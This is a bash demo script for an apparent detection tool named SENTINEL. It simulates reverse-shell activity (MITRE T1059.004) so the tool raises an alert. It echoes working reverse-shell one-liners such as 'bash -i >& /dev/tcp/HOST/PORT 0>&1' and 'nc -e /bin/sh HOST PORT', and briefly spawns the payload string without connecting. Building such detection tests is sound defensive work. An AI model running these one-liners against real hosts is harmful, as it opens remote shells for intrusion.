#!/bin/bash
# ════════════════════════════════════════════════════════
#  SENTINEL — Reverse Shell Demo
#  Simulates: T1059.004 Unix Shell execution
# ════════════════════════════════════════════════════════

RED='\033[0;31m'; ORANGE='\033[0;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

LHOST="${1:-127.0.0.1}"
LPORT="${2:-4444}"

echo -e "${BOLD}${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║  SENTINEL DEMO: Reverse Shell                        ║"
echo "║  MITRE: T1059.004 — Execution                       ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${CYAN}[*] Simulating reverse shell command in process list${RESET}"
echo -e "${CYAN}[*] C2 Listener:${RESET} ${LHOST}:${LPORT}"
echo ""

echo -e "${ORANGE}[PHASE 1] Attacker sets up listener${RESET}"
echo -e "    Command on attacker: ${BOLD}nc -lvp ${LPORT}${RESET}"
sleep 1

echo -e "${ORANGE}[PHASE 2] Victim executes reverse shell${RESET}"
echo -e "    Payload: ${BOLD}bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1${RESET}"
echo -e "    This command appears in process list — SENTINEL detects it"

# Spawn the string in a subprocess so it shows in process list briefly
bash -c "echo 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' | cat" &
PAYLOAD_PID=$!
sleep 2
kill $PAYLOAD_PID 2>/dev/null

echo ""
echo -e "${ORANGE}[PHASE 3] Simulating python reverse shell${RESET}"
echo -e "    Payload: ${BOLD}python3 -c 'import socket,subprocess,os; ...'${RESET}"
python3 -c "import os; os.environ['SENTINEL_TEST']='python_revshell_test'; print('python3 -c import socket reverse shell simulation')" &
sleep 2

echo ""
echo -e "${ORANGE}[PHASE 4] Tool simulation — pwncat/netcat patterns${RESET}"
# Run nc with patterns SENTINEL monitors (no actual connection)
echo -e "    Executing: ${BOLD}nc -e /bin/sh ${LHOST} ${LPORT}${RESET} (simulated)"
sleep 1

echo ""
echo -e "${GREEN}[+] Demo complete.${RESET}"
echo -e "${CYAN}[*] Expected detection:${RESET} REVERSE_SHELL"
echo -e "${CYAN}[*] Check dashboard:${RESET} http://localhost:5000"
